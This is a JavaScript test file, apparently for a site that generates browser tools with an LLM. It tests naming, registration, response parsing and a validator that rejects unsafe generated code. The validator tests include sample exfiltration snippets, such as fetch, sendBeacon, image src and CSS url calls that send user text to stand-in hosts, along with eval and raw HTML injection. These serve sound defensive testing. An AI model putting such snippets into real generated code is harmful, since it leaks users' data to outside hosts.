import test from 'node:test';
import assert from 'node:assert/strict';
import {
  checkGeneratedSource,
  componentNameFromTitle,
  extractRegisteredComponents,
  insertAboveMarker,
  parseGeneratedTool,
  registerGeneratedTool,
} from '../lib/tool-generation-rules.ts';

const validSource = `'use client';

import { useState } from 'react';
import { Copy } from 'lucide-react';

export function CompteurDeMots() {
  const [text, setText] = useState('');
  const url = new URL('https://jchub.dev');
  return <div><Copy />{text.split(/\\s+/).length}{url.host}<textarea value={text} onChange={(event) => setText(event.target.value)} /></div>;
}
`;

test('nomme le composant en PascalCase sans accents ni collision', () => {
  assert.equal(componentNameFromTitle('Compteur de mots', []), 'CompteurDeMots');
  assert.equal(componentNameFromTitle('Générateur d’étiquettes', []), 'GenerateurDEtiquettes');
  assert.equal(componentNameFromTitle('2FA pour équipes', []), 'Outil2faPourEquipes');
  assert.equal(componentNameFromTitle('Compteur de mots', ['CompteurDeMots', 'CompteurDeMots2']), 'CompteurDeMots3');
});

test('lit la liste des composants enregistrés', () => {
  const source = "export const TOOL_COMPONENTS = [\n  'Base64Tool',\n  'UrlEncoder',\n  // @generated-tools: marker\n] as const;";
  assert.deepEqual(extractRegisteredComponents(source), ['Base64Tool', 'UrlEncoder']);
});

test('accepte un outil qui reste dans le navigateur', () => {
  assert.deepEqual(checkGeneratedSource(validSource, 'CompteurDeMots'), []);
});

test('refuse le réseau, le stockage, l’exécution dynamique et les imports non autorisés', () => {
  const cases = [
    ["fetch('https://exemple.com/?d=' + text);", /réseau/],
    ['navigator.sendBeacon("/x", text);', /réseau/],
    ['localStorage.setItem("t", text);', /stockage/],
    ['eval(text);', /exécution/],
    ['<div dangerouslySetInnerHTML={{ __html: text }} />', /HTML/],
    ['<img src={"https://exemple.com/?d=" + text} />', /ressource externe/],
    ['const img = new Image(); img.src = text;', /ressource externe/],
    ['<div style={{ backgroundImage: `url(https://x.y/${text})` }} />', /CSS/],
    ['window.location = "https://exemple.com";', /navigation/],
    ["import('lodash');", /chargement dynamique/],
  ];
  for (const [snippet, expected] of cases) {
    const problems = checkGeneratedSource(validSource.replace('return <div>', `${snippet}\n  return <div>`), 'CompteurDeMots');
    assert.ok(problems.some((problem) => expected.test(problem)), `${snippet} devrait être refusé : ${problems.join(' | ')}`);
  }
  const badImport = checkGeneratedSource(validSource.replace("from 'lucide-react'", "from 'axios'"), 'CompteurDeMots');
  assert.ok(badImport.some((problem) => problem.includes('axios')));
});

test('exige use client et l’export nommé attendu', () => {
  const problems = checkGeneratedSource(validSource.replace("'use client';", '').replace('export function CompteurDeMots', 'export default function Autre'), 'CompteurDeMots');
  assert.equal(problems.length, 3);
});

test('insère les nouveaux outils au-dessus du marqueur, sans doublon', () => {
  const components = "export const TOOL_COMPONENTS = [\r\n  'UrlEncoder',\r\n  // @generated-tools: marker\r\n] as const;";
  const renderer = "const tools = {\n  UrlEncoder: x,\n  // @generated-tools: marker\n};";
  const result = registerGeneratedTool(components, renderer, 'CompteurDeMots');
  assert.equal(result.components, "export const TOOL_COMPONENTS = [\r\n  'UrlEncoder',\r\n  'CompteurDeMots',\r\n  // @generated-tools: marker\r\n] as const;");
  assert.match(result.renderer, /  CompteurDeMots: dynamic\(\(\) => import\('@\/components\/tools\/generated\/CompteurDeMots'\)\.then\(\(m\) => m\.CompteurDeMots\)\),\n  \/\/ @generated-tools/);
  assert.equal(insertAboveMarker(result.components, "'CompteurDeMots',"), result.components);
  assert.throws(() => insertAboveMarker('const a = [];', "'X',"), /Marqueur/);
});

test('lit la réponse JSON de Gemini et borne les métadonnées', () => {
  const tool = parseGeneratedTool(JSON.stringify({ code: '```tsx\nexport function A() {}\n```', description: 'Compte les mots.', seoTitle: 'Compteur', seoDescription: 'Compte', icon: '🔢', category: 'Inconnue', tags: ['mots', '', 'texte'] }));
  assert.equal(tool.code, 'export function A() {}\n');
  assert.equal(tool.category, 'Développement');
  assert.deepEqual(tool.tags, ['mots', 'texte']);
  assert.throws(() => parseGeneratedTool('pas du json'), /JSON/);
});

test('lit aussi le format bloc tsx + bloc json des modèles sans mode JSON', () => {
  const answer = 'Voici l’outil :\n```tsx\n\'use client\';\nexport function A() { return <p>{"`ok`"}</p>; }\n```\n\nMétadonnées :\n```json\n{"description":"Dit ok.","seoTitle":"A — JcHub","seoDescription":"Dit ok.","icon":"✅","category":"Texte","tags":["ok"]}\n```';
  const tool = parseGeneratedTool(answer);
  assert.equal(tool.code, '\'use client\';\nexport function A() { return <p>{"`ok`"}</p>; }\n');
  assert.equal(tool.category, 'Texte');
  assert.equal(tool.icon, '✅');
  assert.equal(parseGeneratedTool('```tsx\nexport function B() {}\n```').category, 'Développement');
});
